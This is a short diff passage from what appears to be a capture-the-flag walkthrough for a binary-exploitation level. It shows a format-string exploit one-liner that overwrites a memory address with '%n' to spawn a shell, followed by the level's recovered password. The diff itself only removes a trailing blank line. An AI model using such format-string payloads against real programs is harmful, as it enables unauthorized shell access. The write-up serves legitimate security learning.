@@ -17,4 +17,3 @@ Now we surely can create the exploit string, constructing in like we suggested a
     cat <(python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"') - | ./level5
 
 The execution of this code gives us, as expected, access to the shell. Now we can get the password to the next level, as we've done it on the previous levels. Password we've got: `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`.
-
